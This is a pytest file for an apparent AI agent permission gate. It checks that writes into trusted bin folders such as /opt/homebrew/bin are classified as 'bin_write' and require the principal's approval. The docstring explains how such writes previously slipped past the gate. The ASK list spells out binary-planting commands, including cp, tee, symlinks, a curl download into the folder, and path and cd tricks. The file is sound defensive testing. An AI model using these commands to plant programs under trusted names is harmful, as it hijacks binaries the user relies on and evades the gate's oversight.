"""A write into a trusted bin folder asks, on the store's terms (#331).

`_SYSTEM_BIN` trusts a program by path in `/usr/local/bin`, `/opt/homebrew/bin` and `/opt/local/bin`,
and a `PATH` naming those folders is trusted too. A Homebrew install makes them owned and writable
by the user, not root, so the write side was the hole: `cp /tmp/x /opt/homebrew/bin/rg` was `shell`
and `echo x > /opt/homebrew/bin/jq` was `local_write`, both allowed, and the planted file then ran
as `read` under a trusted name. Classification and decision only; nothing is executed.
"""
import pytest

from exo.gate import NO_GRANT, PRINCIPAL_ONLY, approvers_for, classify, decide, normalize_policies

POLICY = normalize_policies({})
LOWERED = normalize_policies({"gates": {"categories": {"bin_write": "allow"}}})


def sh(command):
    return {"tool": "bash", "args": {"command": command}}


def outcome(call, policy=POLICY):
    c = classify(call)
    return c.category, decide(c, policy).outcome


ASK = [
    "cp /tmp/x /opt/homebrew/bin/rg",                       # the issue's rows
    "echo x > /opt/homebrew/bin/jq",
    "cp /tmp/x /usr/local/bin/rg",
    "echo x >> /opt/local/bin/jq",
    "mv /tmp/x /opt/homebrew/bin/rg",
    "install -m 755 /tmp/x /opt/homebrew/bin/rg",
    "dd if=/tmp/x of=/opt/homebrew/bin/rg",
    "ln -s /tmp/x /opt/homebrew/bin/rg",
    "echo x | tee /usr/local/bin/jq",
    "cp /tmp/x /usr/bin/rg",
    "cp /tmp/x /opt/homebrew/bin/",                         # the folder itself is the destination
    "cp -t /opt/homebrew/bin /tmp/x",
    "sed -i s/a/b/ /opt/homebrew/bin/jq",
    "curl -o /opt/homebrew/bin/x https://example.com/x",
    "gcc -o /opt/homebrew/bin/x /tmp/main.c",
    "echo x > /opt/homebrew/bin/../bin/jq",                 # the same folder spelled through ..
    "echo x > /opt/homebrew/bin/{jq,rg}",                  # a brace set naming files in it
    "cd /opt/homebrew/bin && cp /tmp/x rg",                 # a relative name after cd into it
    "cd /opt/homebrew/bin && echo x > jq",
]

ALLOW = [
    "/opt/homebrew/bin/rg x",                               # running from there is the trusted path
    "rg x",
    "cat /opt/homebrew/bin/rg",
    "file /opt/homebrew/bin/rg",
    "ls /opt/homebrew/bin",
    "cp /opt/homebrew/bin/rg /tmp/x",                       # copying out is a read of it
    "rsync /opt/homebrew/bin/rg /tmp/x",
    "ln -s /opt/homebrew/bin/rg /tmp/link",                 # a link pointing at it writes elsewhere
    "cp /tmp/x /tmp/y",
    "echo x > /tmp/jq",
    "echo x > /opt/homebrew/bin/sub/jq",                    # a subfolder is not a trusted folder
    "echo x > /home/user/bin/jq",                           # a user's own bin folder is not trusted
]


@pytest.mark.parametrize("line", ASK)
def test_a_write_into_a_trusted_bin_folder_asks(line):
    assert outcome(sh(line)) == ("bin_write", "ask"), line


@pytest.mark.parametrize("line", ALLOW)
def test_reads_runs_and_copies_out_stay_allowed(line):
    category, result = outcome(sh(line))
    assert category != "bin_write" and result == "allow", line


def test_the_bin_floor_holds_under_a_policy_that_allows_the_category():
    c = classify(sh("cp /tmp/x /opt/homebrew/bin/rg"))
    assert decide(c, LOWERED).outcome == "ask"


def test_a_bin_write_is_the_principals_alone_and_never_granted():
    assert "bin_write" in PRINCIPAL_ONLY and "bin_write" in NO_GRANT
    assert approvers_for("bin_write", None) == ["principal"]


def test_a_file_write_tool_into_a_trusted_bin_folder_asks():
    call = {"tool": "write_file", "args": {"path": "/opt/homebrew/bin/rg", "content": "x"}}
    assert outcome(call) == ("bin_write", "ask")
    call = {"tool": "write_file", "args": {"path": "/tmp/rg", "content": "x"}}
    assert outcome(call) == ("local_write", "allow")
